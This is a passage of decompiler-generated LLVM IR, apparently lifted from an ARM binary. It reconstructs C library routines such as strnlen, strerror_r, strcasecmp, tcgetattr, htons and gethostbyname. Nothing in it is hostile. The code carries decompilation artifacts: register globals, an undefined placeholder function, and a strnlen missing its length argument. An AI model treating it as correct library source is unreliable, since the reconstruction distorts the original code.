  uselistorder i32 %v0_127d4, { 1, 0 }
  uselistorder i32 %v6_127c8, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 5, 10, 6, 8, 9, 11, 12, 0, 1, 2, 3, 7, 4 }
  uselistorder i1* %cpsr_z.global-to-local, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 1, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 2, 1, 4, 5, 0, 3 }
  uselistorder label %dec_label_pc_12818, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_127e4, { 2, 3, 0, 1 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1282c = load i32, i32* @r1, align 4
  %v2_1282c = icmp eq i32 %v0_1282c, 0
  br i1 %v2_1282c, label %bb, label %dec_label_pc_1285c

bb:                                               ; preds = %entry
  ret i32 0

dec_label_pc_12844:                               ; preds = %dec_label_pc_1286c
  %v3_12844 = icmp uge i32 %v5_128f8, %v1_12844
  %v9_12844 = icmp eq i32 %v5_128f8, %v1_12844
  %v2_12848 = xor i1 %v3_12844, true
  %v3_12848 = or i1 %v9_12844, %v2_12848
  br i1 %v3_12848, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_12844
  %v6_12848 = sub i32 %v5_128f8, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_12844, %bb19
  %v5_1284c = phi i32 [ %v1_12844, %dec_label_pc_12844 ], [ %v6_12848, %bb19 ]
  %v2_1284c = xor i1 %v9_12844, true
  %v3_1284c = and i1 %v3_12844, %v2_1284c
  br i1 %v3_1284c, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_1284c = sub i32 %v5_1284c, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_12850 = phi i32 [ %v5_1284c, %bb20 ], [ %v6_1284c, %bb21 ]
  ret i32 %v8_12850

dec_label_pc_12854:                               ; preds = %dec_label_pc_128a0
  br label %dec_label_pc_128f4

dec_label_pc_1285c:                               ; preds = %entry
  %v2_1285c = add i32 %tmp, %v0_1282c
  %v3_1285c = icmp ult i32 %v2_1285c, %tmp
  br i1 %v3_1285c, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_1285c
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_1285c, %bb23
  %v5_128f8 = phi i32 [ %v2_1285c, %dec_label_pc_1285c ], [ -1, %bb23 ]
  %v1_1287c2 = urem i32 %tmp, 4
  %v2_1287c3 = icmp eq i32 %v1_1287c2, 0
  br i1 %v2_1287c3, label %dec_label_pc_12884, label %dec_label_pc_1286c

dec_label_pc_1286c:                               ; preds = %bb24, %dec_label_pc_12878
  %v1_12844 = phi i32 [ %v1_12878, %dec_label_pc_12878 ], [ %tmp, %bb24 ]
  %v1_1286c = inttoptr i32 %v1_12844 to i8*
  %v2_1286c = load i8, i8* %v1_1286c, align 1
  %v2_12870 = icmp eq i8 %v2_1286c, 0
  br i1 %v2_12870, label %dec_label_pc_12844, label %dec_label_pc_12878

dec_label_pc_12878:                               ; preds = %dec_label_pc_1286c
  %v1_12878 = add i32 %v1_12844, 1
  %v1_1287c = urem i32 %v1_12878, 4
  %v2_1287c = icmp eq i32 %v1_1287c, 0
  br i1 %v2_1287c, label %dec_label_pc_12884, label %dec_label_pc_1286c

dec_label_pc_12884:                               ; preds = %dec_label_pc_12878, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_12878, %dec_label_pc_12878 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_128e432 = icmp ult i32 %storemerge.lcssa, %v5_128f8
  br i1 %v3_128e432, label %dec_label_pc_1288c, label %dec_label_pc_128f4

dec_label_pc_1288c:                               ; preds = %dec_label_pc_128e0, %dec_label_pc_12884
  %v0_1285439 = phi i32 [ %v4_1288c, %dec_label_pc_128e0 ], [ %storemerge.lcssa, %dec_label_pc_12884 ]
  %v1_1288c = inttoptr i32 %v0_1285439 to i32*
  %v2_1288c = load i32, i32* %v1_1288c, align 4
  %v4_1288c = add i32 %v0_1285439, 4
  store i32 %v4_1288c, i32* @lr, align 4
  %v2_12890 = add i32 %v2_1288c, -16843009
  %v2_12894 = and i32 %v2_12890, -2139062144
  %v2_12898 = icmp eq i32 %v2_12894, 0
  br i1 %v2_12898, label %dec_label_pc_128e0, label %dec_label_pc_128a0

dec_label_pc_128a0:                               ; preds = %dec_label_pc_1288c
  %v2_128a0 = inttoptr i32 %v0_1285439 to i8*
  %v3_128a0 = load i8, i8* %v2_128a0, align 1
  %v2_128a8 = icmp eq i8 %v3_128a0, 0
  %v1_128ac = add i32 %v0_1285439, 1
  br i1 %v2_128a8, label %dec_label_pc_12854, label %dec_label_pc_128b4

dec_label_pc_128b4:                               ; preds = %dec_label_pc_128a0
  %v2_128b4 = inttoptr i32 %v1_128ac to i8*
  %v3_128b4 = load i8, i8* %v2_128b4, align 1
  %v2_128b8 = icmp eq i8 %v3_128b4, 0
  br i1 %v2_128b8, label %dec_label_pc_128f4, label %dec_label_pc_128c0

dec_label_pc_128c0:                               ; preds = %dec_label_pc_128b4
  %v1_128c0 = add i32 %v0_1285439, 2
  %v2_128c0 = inttoptr i32 %v1_128c0 to i8*
  %v3_128c0 = load i8, i8* %v2_128c0, align 1
  %v2_128c4 = icmp eq i8 %v3_128c0, 0
  br i1 %v2_128c4, label %dec_label_pc_128f4, label %dec_label_pc_128d0

dec_label_pc_128d0:                               ; preds = %dec_label_pc_128c0
  %v1_128d0 = add i32 %v0_1285439, 3
  %v2_128d0 = inttoptr i32 %v1_128d0 to i8*
  %v3_128d0 = load i8, i8* %v2_128d0, align 1
  %v2_128d4 = icmp eq i8 %v3_128d0, 0
  br i1 %v2_128d4, label %dec_label_pc_128f4, label %dec_label_pc_128e0

dec_label_pc_128e0:                               ; preds = %dec_label_pc_128d0, %dec_label_pc_1288c
  %v3_128e4 = icmp ult i32 %v4_1288c, %v5_128f8
  br i1 %v3_128e4, label %dec_label_pc_1288c, label %dec_label_pc_128f4

dec_label_pc_128f4:                               ; preds = %dec_label_pc_128e0, %dec_label_pc_12884, %dec_label_pc_128b4, %dec_label_pc_128c0, %dec_label_pc_128d0, %dec_label_pc_12854
  %v1_128f4 = phi i32 [ %v0_1285439, %dec_label_pc_12854 ], [ %storemerge.lcssa, %dec_label_pc_12884 ], [ %v1_128ac, %dec_label_pc_128b4 ], [ %v1_128c0, %dec_label_pc_128c0 ], [ %v1_128d0, %dec_label_pc_128d0 ], [ %v5_128f8, %dec_label_pc_128e0 ]
  %v3_128f4 = icmp uge i32 %v5_128f8, %v1_128f4
  %v9_128f4 = icmp eq i32 %v5_128f8, %v1_128f4
  %v2_128f8 = xor i1 %v3_128f4, true
  %v3_128f8 = or i1 %v9_128f4, %v2_128f8
  br i1 %v3_128f8, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_128f4
  %v6_128f8 = sub i32 %v5_128f8, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_128f4, %bb25
  %v5_128fc = phi i32 [ %v1_128f4, %dec_label_pc_128f4 ], [ %v6_128f8, %bb25 ]
  %v2_128fc = xor i1 %v9_128f4, true
  %v3_128fc = and i1 %v3_128f4, %v2_128fc
  br i1 %v3_128fc, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_128fc = sub i32 %v5_128fc, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_12900 = phi i32 [ %v5_128fc, %bb26 ], [ %v6_128fc, %bb27 ]
  ret i32 %v8_12900

; uselistorder directives
  uselistorder i1 %v3_128f4, { 1, 0 }
  uselistorder i32 %v4_1288c, { 1, 2, 0 }
  uselistorder i32 %v0_1285439, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_12878, { 1, 0, 2 }
  uselistorder i32 %v1_12844, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_128f8, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_12844, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_128f4, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_1286c, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v3_1290c = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_12914 = call i32 @__xpg_strerror_r()
  %v0_12918 = load i32, i32* @r4, align 4
  store i32 %v3_1290c, i32* @r4, align 4
  ret i32 %v0_12918
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_12920 = load i32, i32* @r4, align 4
  %v6_12920 = load i32, i32* @r5, align 4
  %v9_12920 = load i32, i32* @r6, align 4
  %v15_12920 = load i32, i32* @r8, align 4
  %v0_12924 = load i32, i32* @r0, align 4
  %v0_12930 = load i32, i32* @r1, align 4
  store i32 %v0_12930, i32* @r8, align 4
  %v0_12934 = load i32, i32* @r2, align 4
  store i32 %v0_12934, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_12924, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_1296c

thread-pre-split.preheader:                       ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_1d6f8.662 to i32), i32* @r5, align 4
  %v2_129543446 = icmp eq i32 %v0_12924, 0
  br i1 %v2_129543446, label %bb26, label %dec_label_pc_12948.lr.ph

dec_label_pc_12948:                               ; preds = %dec_label_pc_12948.lr.ph, %bb
  %v2_1296041 = phi i1 [ %v2_129603849, %dec_label_pc_12948.lr.ph ], [ %v2_12960, %bb ]
  %v1_1296440 = phi i32 [ %v0_12954.pr48, %dec_label_pc_12948.lr.ph ], [ %v2_12950, %bb ]
  %v0_1294c39 = phi i32 [ %v0_12958547, %dec_label_pc_12948.lr.ph ], [ %v1_1294c, %bb ]
  %v1_1294c = add i32 %v0_1294c39, 1
  store i32 %v1_1294c, i32* @r5, align 4
  br i1 %v2_1296041, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_12948
  %v2_12950 = add i32 %v1_1296440, -1
  %v2_12954 = icmp eq i32 %v2_12950, 0
  %v1_12958 = inttoptr i32 %v1_1294c to i8*
  %v2_12958 = load i8, i8* %v1_12958, align 1
  %v2_12960 = icmp eq i8 %v2_12958, 0
  br i1 %v2_12954, label %dec_label_pc_12960, label %dec_label_pc_12948

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_12948
  %v1_1295835 = inttoptr i32 %v1_1294c to i8*
  %v2_1295836 = load i8, i8* %v1_1295835, align 1
  %v2_1296038 = icmp eq i8 %v2_1295836, 0
  br label %dec_label_pc_12948.lr.ph

dec_label_pc_12948.lr.ph:                         ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
  %v2_129603849 = phi i1 [ %v2_1296038, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_12954.pr48 = phi i32 [ %v1_1296440, %thread-pre-split.loopexit ], [ %v0_12924, %thread-pre-split.preheader ]
  %v0_12958547 = phi i32 [ %v1_1294c, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_1d6f8.662 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_12948

dec_label_pc_12960:                               ; preds = %bb
  br i1 %v2_12960, label %dec_label_pc_1296c, label %bb26

bb26:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_12960
  %v0_1294c.lcssa55 = phi i32 [ %v1_1294c, %dec_label_pc_12960 ], [ ptrtoint ([8 x i8]* @global_var_1d6f8.662 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_129a0

dec_label_pc_1296c:                               ; preds = %dec_label_pc_12960, %entry
  %v3_12970 = ashr i32 %v0_12924, 31
  %v5_12984 = bitcast i32* %stack_var_-25 to i8*
  %v6_12984 = call i32 @_uintmaxtostr(i8* %v5_12984, i32 %v0_12924, i32 %v3_12970, i32 -10, i32 0)
  %v1_12988 = add i32 %v6_12984, -14
  store i32 %v1_12988, i32* @r5, align 4
  store i32 %v1_12988, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1d6e8.664 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_12998 = call i32 @memcpy()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_129a0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_129a0

dec_label_pc_129a0:                               ; preds = %bb26, %dec_label_pc_1296c
  %v0_129a0 = phi i32 [ %v0_1294c.lcssa55, %bb26 ], [ %v0_129a0.pre, %dec_label_pc_1296c ]
  %v1_129a0 = inttoptr i32 %v0_129a0 to i8*
  %v3_129a4 = call i32 @strlen(i8* %v1_129a0)
  %v0_129a8 = load i32, i32* @r8, align 4
  %v2_129a8 = icmp eq i32 %v0_129a8, 0
  %v1_129ac = add i32 %v3_129a4, 1
  store i32 %v1_129ac, i32* @r4, align 4
  br i1 %v2_129a8, label %bb27, label %dec_label_pc_129a0._crit_edge

dec_label_pc_129a0._crit_edge:                    ; preds = %dec_label_pc_129a0
  %v1_129b4.pre = load i32, i32* @r6, align 4
  br label %bb28

bb27:                                             ; preds = %dec_label_pc_129a0
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_129a0._crit_edge, %bb27
  %v4_129b8 = phi i32 [ %v1_129b4.pre, %dec_label_pc_129a0._crit_edge ], [ 0, %bb27 ]
  %tmp56 = icmp ugt i32 %v1_129ac, %v4_129b8
  br i1 %tmp56, label %bb29, label %.thread16

bb29:                                             ; preds = %bb28
  store i32 %v4_129b8, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb28, %bb29
  %v0_129c814 = phi i32 [ %v4_129b8, %bb29 ], [ %v1_129ac, %bb28 ]
  %v2_129c0 = icmp eq i32 %v0_129c814, 0
  br i1 %v2_129c0, label %dec_label_pc_129e4, label %dec_label_pc_129c8

dec_label_pc_129c8:                               ; preds = %.thread16
  store i32 %v0_129c814, i32* @r2, align 4
  %v0_129cc = load i32, i32* @r5, align 4
  store i32 %v0_129cc, i32* @r1, align 4
  store i32 %v0_129a8, i32* @r0, align 4
  %v0_129d4 = call i32 @memcpy()
  %v0_129d8 = load i32, i32* @r8, align 4
  %v1_129d8 = load i32, i32* @r4, align 4
  %v2_129d8 = add i32 %v1_129d8, %v0_129d8
  %v3_129e0 = add i32 %v2_129d8, -1
  %v4_129e0 = inttoptr i32 %v3_129e0 to i8*
  store i8 0, i8* %v4_129e0, align 1
  br label %dec_label_pc_129e4

dec_label_pc_129e4:                               ; preds = %.thread16, %dec_label_pc_129c8
  %v0_129e4 = load i32, i32* %r7.global-to-local, align 4
  %v2_129e4 = icmp eq i32 %v0_129e4, 0
  br i1 %v2_129e4, label %dec_label_pc_129f4, label %dec_label_pc_129ec

dec_label_pc_129ec:                               ; preds = %dec_label_pc_129e4
  %v0_129ec = call i32 @__errno_location()
  %v0_129f0 = load i32, i32* %r7.global-to-local, align 4
  %v2_129f0 = inttoptr i32 %v0_129ec to i32*
  store i32 %v0_129f0, i32* %v2_129f0, align 4
  %v0_129f4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_129f4

dec_label_pc_129f4:                               ; preds = %dec_label_pc_129e4, %dec_label_pc_129ec
  %v0_129f4 = phi i32 [ 0, %dec_label_pc_129e4 ], [ %v0_129f4.pre, %dec_label_pc_129ec ]
  store i32 %v3_12920, i32* @r4, align 4
  store i32 %v6_12920, i32* @r5, align 4
  store i32 %v9_12920, i32* @r6, align 4
  store i32 %v15_12920, i32* @r8, align 4
  ret i32 %v0_129f4

; uselistorder directives
  uselistorder i32 %v4_129b8, { 1, 2, 0 }
  uselistorder i32 %v1_129ac, { 1, 0, 2 }
  uselistorder i32 %v1_1294c, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_12924, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder label %dec_label_pc_129f4, { 1, 0 }
  uselistorder label %dec_label_pc_129e4, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_129a0, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_12a18

dec_label_pc_12a18:                               ; preds = %bb8, %entry
  %v8_12a7c3 = phi i32 [ %v8_12a7c, %bb8 ], [ 0, %entry ]
  %v0_12a70 = phi i32 [ %v1_12a70, %bb8 ], [ %arg2, %entry ]
  %v0_12a74 = phi i32 [ %v1_12a74, %bb8 ], [ %tmp, %entry ]
  %v9_12a18 = icmp eq i32 %v0_12a74, %v0_12a70
  br i1 %v9_12a18, label %dec_label_pc_12a18._crit_edge, label %dec_label_pc_12a20

dec_label_pc_12a18._crit_edge:                    ; preds = %dec_label_pc_12a18
  %.pre = inttoptr i32 %v0_12a70 to i8*
  br label %bb8

dec_label_pc_12a20:                               ; preds = %dec_label_pc_12a18
  %v1_12a24 = inttoptr i32 %v0_12a74 to i8*
  %v2_12a24 = load i8, i8* %v1_12a24, align 1
  %v3_12a24 = zext i8 %v2_12a24 to i32
  %v1_12a28 = inttoptr i32 %v0_12a70 to i8*
  %v2_12a28 = load i8, i8* %v1_12a28, align 1
  %v3_12a28 = zext i8 %v2_12a28 to i32
  %v2_12a2c = load i32, i32* bitcast (i32** @global_var_2b8a0.666 to i32*), align 4
  %v2_12a30 = mul nuw nsw i32 %v3_12a24, 2
  store i32 %v2_12a30, i32* @ip, align 4
  %v2_12a34 = mul nuw nsw i32 %v3_12a28, 2
  %v2_12a38 = add i32 %v2_12a34, %v2_12a2c
  %v2_12a3c = add i32 %v2_12a2c, %v2_12a30
  %v1_12a40 = add i32 %v2_12a3c, 1
  %v2_12a40 = inttoptr i32 %v1_12a40 to i8*
  %v3_12a40 = load i8, i8* %v2_12a40, align 1
  %v4_12a40 = zext i8 %v3_12a40 to i32
  %v1_12a44 = add i32 %v2_12a38, 1
  %v2_12a44 = inttoptr i32 %v1_12a44 to i8*
  %v3_12a44 = load i8, i8* %v2_12a44, align 1
  %v4_12a44 = zext i8 %v3_12a44 to i32
  %v3_12a48 = inttoptr i32 %v2_12a38 to i8*
  %v4_12a48 = load i8, i8* %v3_12a48, align 1
  %v6_12a48 = zext i8 %v4_12a48 to i32
  %v3_12a4c = inttoptr i32 %v2_12a3c to i8*
  %v4_12a4c = load i8, i8* %v3_12a4c, align 1
  %v6_12a4c = zext i8 %v4_12a4c to i32
  %v3_12a50 = mul nuw i32 %v4_12a44, 16777216
  %v3_12a54 = mul nuw i32 %v4_12a40, 16777216
  %v4_12a58 = sdiv i32 %v3_12a54, 65536
  %v5_12a58 = or i32 %v6_12a4c, %v4_12a58
  %v4_12a5c = sdiv i32 %v3_12a50, 65536
  %v5_12a5c = or i32 %v4_12a5c, %v6_12a48
  %v2_12a60 = sub nsw i32 %v5_12a58, %v5_12a5c
  %v9_12a60 = icmp eq i32 %v5_12a58, %v5_12a5c
  br i1 %v9_12a60, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_12a20
  ret i32 %v2_12a60

bb8:                                              ; preds = %dec_label_pc_12a18._crit_edge, %dec_label_pc_12a20
  %v1_12a68.pre-phi = phi i8* [ %.pre, %dec_label_pc_12a18._crit_edge ], [ %v1_12a24, %dec_label_pc_12a20 ]
  %v8_12a7c = phi i32 [ %v8_12a7c3, %dec_label_pc_12a18._crit_edge ], [ %v2_12a60, %dec_label_pc_12a20 ]
  %v2_12a68 = load i8, i8* %v1_12a68.pre-phi, align 1
  %v2_12a6c = icmp eq i8 %v2_12a68, 0
  %v1_12a70 = add i32 %v0_12a70, 1
  %v1_12a74 = add i32 %v0_12a74, 1
  store i32 %v1_12a74, i32* @lr, align 4
  br i1 %v2_12a6c, label %dec_label_pc_12a7c, label %dec_label_pc_12a18

dec_label_pc_12a7c:                               ; preds = %bb8
  ret i32 %v8_12a7c

; uselistorder directives
  uselistorder i32 %v1_12a74, { 1, 0 }
  uselistorder i32 %v2_12a60, { 1, 0 }
  uselistorder i32 %v5_12a5c, { 1, 0 }
  uselistorder i32 %v5_12a58, { 1, 0 }
  uselistorder i32 %v2_12a30, { 1, 0 }
  uselistorder i32 %v0_12a70, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 ptrtoint (i16** @global_var_2feb8.668 to i32), i32* @r2, align 4
  %v0_12a88 = call i32 @strtok_r()
  %v0_12a8c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12a8c, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v1_12a8c = load i32, i32* @r2, align 4
  %v2_12a8c = inttoptr i32 %v1_12a8c to i16*
  store i16 10900, i16* %v2_12a8c, align 2
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_12a88

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %v2_12a94 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_12a94, i32* @r1, align 4
  %v0_12a9c = call i32 @__GI_tcgetattr()
  %v1_12aa0 = sub i32 1, %v0_12a9c
  %v2_12aa0 = icmp ult i32 %v0_12a9c, 2
  br i1 %v2_12aa0, label %bb4, label %bb

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_12aac = phi i32 [ %v1_12aa0, %entry ], [ 0, %bb ]
  ret i32 %v5_12aac

; uselistorder directives
  uselistorder i32 %v0_12a9c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__libc_tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %v0_12ab8 = load i32, i32* @r0, align 4
  %v4_12ab8 = call i32 @ioctl(i32 %v0_12ab8, i32 21513, i32 1)
  %v0_12abc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12abc, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v4_12ab8

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12ac0 = load i32, i32* @r4, align 4
  %v6_12ac0 = load i32, i32* @r5, align 4
  %v2_12ac4 = ptrtoint i32* %stack_var_-56 to i32
  %v0_12ac8 = load i32, i32* @r1, align 4
  store i32 %v0_12ac8, i32* %r6.global-to-local, align 4
  %v0_12ad4 = load i32, i32* @r0, align 4
  %v3_12ad4 = call i32 @ioctl(i32 %v0_12ad4, i32 21505, i32 %v2_12ac4)
  store i32 %v3_12ad4, i32* %r7.global-to-local, align 4
  %v2_12ad8 = icmp eq i32 %v3_12ad4, 0
  %v2_12ae0 = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_12ae0, i32* @r1, align 4
  %v0_12ae8 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_12ad8, label %dec_label_pc_12af0, label %dec_label_pc_12b1c

dec_label_pc_12af0:                               ; preds = %entry
  %v1_12ae8 = add i32 %v0_12ae8, 17
  %v4_12af8 = zext i8 %tmp to i32
  store i32 %v4_12af8, i32* @r5, align 4
  %v2_12afc = load i32, i32* %stack_var_-56, align 4
  %v1_12b00 = inttoptr i32 %v0_12ae8 to i32*
  store i32 %v2_12afc, i32* %v1_12b00, align 4
  %v3_12b00 = add i32 %v0_12ae8, 4
  %v4_12b00 = inttoptr i32 %v3_12b00 to i32*
  %v5_12b00 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12b00, i32* %v4_12b00, align 4
  %v6_12b00 = add i32 %v0_12ae8, 8
  %v7_12b00 = inttoptr i32 %v6_12b00 to i32*
  %v8_12b00 = load i32, i32* @lr, align 4
  store i32 %v8_12b00, i32* %v7_12b00, align 4
  %v0_12b04 = load i32, i32* @r4, align 4
  %v1_12b04 = load i32, i32* %r6.global-to-local, align 4
  %v2_12b04 = add i32 %v1_12b04, 12
  %v3_12b04 = inttoptr i32 %v2_12b04 to i32*
  store i32 %v0_12b04, i32* %v3_12b04, align 4
  %v0_12b08 = load i32, i32* @r5, align 4
  %v1_12b08 = trunc i32 %v0_12b08 to i8
  %v2_12b08 = load i32, i32* %r6.global-to-local, align 4
  %v3_12b08 = add i32 %v2_12b08, 16
  %v4_12b08 = inttoptr i32 %v3_12b08 to i8*
  store i8 %v1_12b08, i8* %v4_12b08, align 1
  %v4_12b0c = call i32 @__GI_mempcpy(i32 %v1_12ae8, i32 %v2_12ae0, i32 19, i32 %v2_12afc)
  store i32 %v4_12b0c, i32* @r0, align 4
  %v0_12b10 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_12b10, i32* @r1, align 4
  store i32 13, i32* @r2, align 4
  %v0_12b18 = call i32 @__GI_memset()
  br label %dec_label_pc_12b1c

dec_label_pc_12b1c:                               ; preds = %entry, %dec_label_pc_12af0
  %v0_12b1c = phi i32 [ %v3_12ad4, %entry ], [ %v0_12b10, %dec_label_pc_12af0 ]
  store i32 %v3_12ac0, i32* @r4, align 4
  store i32 %v6_12ac0, i32* @r5, align 4
  ret i32 %v0_12b1c

; uselistorder directives
  uselistorder i32 %v0_12ae8, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_12b1c, { 1, 0 }
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_12b48 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_12b48
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_12b58 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_12b5c = urem i32 %tmp1, 256
  %v5_12b5c = or i32 %v4_12b5c, %v1_12b58
  ret i32 %v5_12b5c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_12b80 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_12b80
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_12b90 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_12b94 = urem i32 %tmp1, 256
  %v5_12b94 = or i32 %v4_12b94, %v1_12b90
  ret i32 %v5_12b94

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_12ba0 = ptrtoint i32* %stack_var_-8 to i32
  %v0_12ba8 = load i32, i32* @r0, align 4
  %v2_12ba8 = inttoptr i32 %v0_12ba8 to i8*
  %v3_12ba8 = call i32 @inet_aton(i8* %v2_12ba8, i32 %v2_12ba0)
  %v2_12bac = icmp eq i32 %v3_12ba8, 0
  br i1 %v2_12bac, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_12bb4 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_12bbc = phi i32 [ -1, %entry ], [ %v3_12bb4, %bb ]
  ret i32 %v5_12bbc

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_12bc0 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_12bcc = call i32 @__GI___h_errno_location()
  %v2_12bd0 = ptrtoint i32* %stack_var_-12 to i32
  %v0_12bdc = load i32, i32* @r4, align 4
  %v7_12bec = call i32 @gethostbyname_r(i32 %v0_12bdc, i32* nonnull @global_var_30088.672, i32 ptrtoint (i32* @global_var_2febc.674 to i32), i32 460, i32 %v2_12bd0, i32 %v0_12bcc)
  %v3_12bf0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_12bc0, i32* @r4, align 4
  ret i32 %v3_12bf0
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
